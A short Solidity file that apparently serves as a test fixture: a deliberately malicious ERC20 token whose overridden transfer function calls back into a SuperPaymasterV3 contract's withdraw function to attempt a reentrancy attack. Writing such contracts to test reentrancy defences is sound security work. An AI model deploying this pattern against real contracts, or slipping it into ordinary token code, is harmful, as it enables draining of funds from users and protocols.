// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ISuperPaymaster {
    function withdraw(uint256 amount) external;
}

contract MaliciousAPNTs is ERC20 {
    ISuperPaymaster public superPaymaster;
    address public attacker;
    bool public attacking;

    constructor() ERC20("Malicious aPNTs", "mAPNTs") {
        _mint(msg.sender, 1000 ether);
    }

    function setSuperPaymaster(address _sp) external {
        superPaymaster = ISuperPaymaster(_sp);
    }

    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (to == attacker && !attacking) {
            attacking = true;
            // Attempt reentrancy: call withdraw again during the transfer callback (if any)
            // or just try to call it here. 
            // In SuperPaymasterV3, withdraw calls safeTransfer(msg.sender, amount).
            // safeTransfer will call this transfer function.
            superPaymaster.withdraw(1);
            attacking = false;
        }
        return super.transfer(to, amount);
    }
    
    // safeTransfer uses transfer or transferFrom. 
    // We override transfer for this simple test.
}
